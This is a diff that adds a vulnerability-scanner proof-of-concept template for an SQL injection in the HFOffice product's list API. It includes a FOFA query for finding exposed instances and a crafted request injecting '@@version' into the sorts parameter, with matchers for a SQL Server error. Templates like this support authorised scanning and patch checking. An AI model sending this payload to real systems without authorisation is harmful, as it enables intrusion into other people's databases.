@@ -1,0 +1,22 @@
+id: poc-yaml-hongfan-HFOffice-list-sqli
+info:
+  name: 红帆HFOffice list接口SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: HFOffice
+  fofa: body="./config/pc-app-config.js" && title="HFOffice"
+requests:
+- method: GET
+  path: /api/switch-value/list?sorts=[{"Field":"1-@@version"}]&conditions=[]&_ZQA_ID=4dc296c6c69905a7
+  expression: 'status_code == 400 &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(headers,"text/plain") &&
+
+    contains(body,"nvarchar")
+
+    '
+variables: {}
+transport: http
